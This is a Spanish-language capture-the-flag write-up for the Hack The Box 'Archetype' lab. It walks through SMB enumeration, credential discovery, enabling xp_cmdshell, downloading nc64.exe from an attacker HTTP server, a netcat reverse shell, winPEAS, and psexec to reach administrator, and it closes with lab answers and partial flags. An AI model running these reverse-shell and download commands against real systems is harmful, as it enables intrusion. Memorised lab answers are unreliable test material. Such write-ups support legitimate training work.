---
title: HackThebox - Archetype
date: 2023-05-29
categories: [Hackthebox, HTB-VeryEasy]
tags: [Starting Point, Windows]
image:
  path: ../../assets/img/post/archetype/archetype.png
  width: 800
  height: 500
  alt:
---

En este articulo vamos a estar vulnerando la maquina archetype de la plaforma Hackthebox.

## Reconicimiento

Lo primero que haremos seria hacer un ping a la maquina victima:
```bash
❯ ping -c 1 10.129.50.163
PING 10.129.50.163 (10.129.50.163) 56(84) bytes of data.
64 bytes from 10.129.50.163: icmp_seq=1 ttl=127 time=52.4 ms

--- 10.129.50.163 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 52.376/52.376/52.376/0.000 ms
```

Paquete enviado y recibimos el paquete devuelta, esto nos indica que tenemos conexion con la maquina victima.

Vamos a empezar nuestro escaneo con nmap:
```bash
❯ nmap -sC -sS -sV -p- --min-rate 5000 -Pn -n 10.129.50.163 -oN scan
```

Todo esto lo guardamos en un archivo, formato nmap.

El resultado de nuestro reporte es el siguiente: 

```bash 
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2023-04-27T19:01:43+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.50.163:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.50.163:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-27T18:56:11
|_Not valid after:  2053-04-27T18:56:11
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-27T12:01:35-07:00
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-time: 
|   date: 2023-04-27T19:01:34
|_  start_date: N/A
```

Tenemos Varios puertos abiertos.
## Enumeracion 

Vamos a tirar en un principio por el puerto 1433, le lanzamos un smbclient para ver los recursos compartidos disponibles como usuario anonymous.

```bash
❯ sudo smbclient -N -L 10.129.50.163
```

- -N : Para que no nos pida password
- -L : Para listar el contenido disponible.

Nos Da como resultado lo siguiente:

```bash
❯ sudo smbclient -N -L 10.129.50.163

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```
Tenemos el recurso compartido Backups, el cual no tiene ninguna password. por lo que vamos a acdeder a este.

```bash 
❯ smbclient -N \\\\10.129.50.163\\backups\\
```

Listamos el contenido:
```bash
smb: \> dir
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		5056511 blocks of size 4096. 2616632 blocks available
```

Encontramos un archivo, que nos puede servir de algo, asi que lo descargamos usando "get".

```bash 
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

Miramos el contenido del archivo:
```bash
❯ batcat prod.dtsConfig 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: prod.dtsConfig
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <DTSConfiguration>
   2   │     <DTSConfigurationHeading>
   3   │         <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
   4   │     </DTSConfigurationHeading>
   5   │     <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
   6   │         <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=Fa
       │ lse;</ConfiguredValue>
   7   │     </Configuration>
   8   │ </DTSConfiguration>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Aqui tenemos el contenido del archivo.

Tenmos credenciales por lo que vamos a intentar conectarnos al Servidor SQL usando mssqlclient.py de Impacket

Nos descargamos el archivo con wget:

```bash
wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
```

Ejecutamos la herramienta :

```bash
❯ python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.50.163 -windows-auth
```

Ahora podemos utilizar la función IS_SRVROLEMEMBER para comprobar si el usuario actual de SQL tiene privilegios de sysadmin (nivel más alto) en el Servidor SQL.

![img](/assets/img/post/archetype/sql.png) 

Esto nos devuelve el valor 1, por los que si tenemos privilegios.

## Explotacion
Vamos a usar xp_cmdshell.

xp_cmdshell es una función de Transact-SQL (T-SQL) en Microsoft SQL Server que permite a los usuarios ejecutar comandos del sistema operativo desde dentro de una consulta SQL. Básicamente, xp_cmdshell se utiliza para ejecutar comandos de shell en el sistema operativo desde una sesión de SQL Server.

Primero nesecitamos configurarlo, usamos los siguientes comandos:
```bash
EXEC sp_configure 'Show Advanced Options', 1; 
```

```bash
reconfigure;  
```

```bash
sp_configure; 
``` 

```bash
EXEC sp_configure 'xp_cmdshell', 1;
```

```bash
reconfigure; 
```

```bash
xp_cmdshell "whoami"
```
Con la ultima linea de comando confirmamos:

```bash 
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami" 
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL  
```

Ya lo tenemos listo, podemos ejecutar comandos en el sistema.

Ahora tratermos de montarnos nuestra reverse shell.

Lo primero seria descargar nc (netcat para windows) y pasarle el archivo a la maquina victima.
```url
https://eternallybored.org/misc/netcat/
```
Luego que ubicamos nuestro archivo nc.exe en un directorio del sistema local.

Lo que haremos es montarnos un server en python, desde la misma ruta del archivo nc.exe.
```bash
❯ python3 -m http.server
```

Vamos a la maquina y ejecutamos lo siguiente:

```powershell
xp_cmdshell "powershell.exe wget http://10.10.14.255:8000/nc64.exe -OutFile c:\\Users\Public\\nc64.exe"
```
Obviamente, cambia la ip, por tu ip de atacante de la interfas tun0.

Esta linea de comando lo que hace es hacer una peticion wget, a nuestro servidor web con python y le indicamos que tome el archivo nc64.exe y que lo coloque en la ruta "c:\\Users\Public\\nc64.exe".

Ahora que tenemos el archivo descargado en la maquina victima lo que vamos a hacer es ejecutarlo para mandarnos la reverse shell.

Nos ponemos en escucha, por el puerto 4444:

```bash
nc -lvnp 4444
```

Vamos a la maquina victima y ejecutamos el archivo, con los siguientes parametros:
```powershell
xp_cmdshell "c:\\Users\Public\\nc64.exe -e cmd.exe 10.10.14.255 4444" 
```

Con este le enviamos la shell a nuestra ip, por el puerto 4444.


![img](/assets/img/post/archetype/shell.png) 

Tenemos una shell Como system32.

Nos dirigimos al directorio Users y tenemos la userflag en localizada.

Se encuentra en este directorio.

```
C:\Users\sql_svc\Desktop
```


```powershell
C:\Users\sql_svc\Desktop > type user.txt
type user.txt
3e7b102e78218e935bf3f495*****
```

## Elevar Privilegios

Utilizaremos Winpeas para ver posibles maneras de elevar privilegios en la maquina victina.

Descargamos la herramienta, aqui te dejo el link. 
- https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe

Pasamos el archivo a la maquina victima de la misma manera que lo hicimos anteriormente.

Montamos nuestro server en python:
```bash
python3 -m http.server
```

Para Obtener nuestro archivo en nuestro sistema de destino. Tenemos que cambiar a PowerShell porque cmd.exe no tiene wget:

```text
powershell
```
```text
wget http://10.10.14.255:8000/winPEASx64.exe -outfile winPEASx64.exe
```
Ya tenemos el archivo en la maquina victima.

Ejecutamos la herramienta.

```powershell
./winPEASx64.exe
```

Al ejecutar la herramienta podemos ver todas las vulnerabilidades de la maquina.

![img](/assets/img/post/archetype/archive.png) 

Vamos a ver que contiene este archivo de texto, que nos reporto la herramienta.

Nos dirigimos a la ruta:
```powershell
cd \
```

```powershell
cd Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
```

Miramos que tiene:
```powershell
type ConsoleHost_history.txt
```

![img](/assets/img/post/archetype/pass.png)

Tenemos las credenciales.

- User: administrator
- Password: MEGACORP_4dm1n!!


Cerramos todo. 

Usaremos la herramienta Psexec.py, es una herramienta que permite ejecutar comandos de forma remota en sistemas Windows a través de una conexión de red. Esta herramienta forma parte del conjunto de herramientas de Sysinternals, una colección de utilidades de software para la administración y diagnóstico de sistemas Windows.

Las descargamos de Github:

```bash 
❯ wget https://github.com/fortra/impacket/blob/master/examples/psexec.py
```
```bash
--2023-05-03 15:24:25--  https://github.com/fortra/impacket/blob/master/examples/psexec.py
Resolving github.com (github.com)... 140.82.112.4
Connecting to github.com (github.com)|140.82.112.4|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘psexec.py’
```

Ejecutamos la herramienta con los siguientes parametros:
```bash
❯ python3 psexec.py administrator@10.129.123.52
```

le colocamos las credenciales encontradas anteriormente.

![img](/assets/img/post/archetype/root.png)

Ya somos Root, Ubicamos la root flag en el directorio, "Users\Administrator\Desktop".

## Tasks

### Task 1. Which TCP port is hosting a database server?
```text
1433
```

### Task 2. What is the name of the non-Administrative share available over SMB? 
```text
backups
```

### Task 3. What is the password identified in the file on the SMB share?
```text
M3g4c0rp123
```

### Task 4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
```text
mssqlclient.py
```

### Task 5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
```text
xp_cmdshell 
```

### Task 6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?
```text 
winpeas
```

### Task 7. What file contains the administrator's password? 
```text
ConsoleHost_history.txt
```

### Submit user flag
```text
3e7b102e78218e935bf3f4951f****
```

### Submit Root flag 
```text
b91ccec3305e98240082d4474b****
```
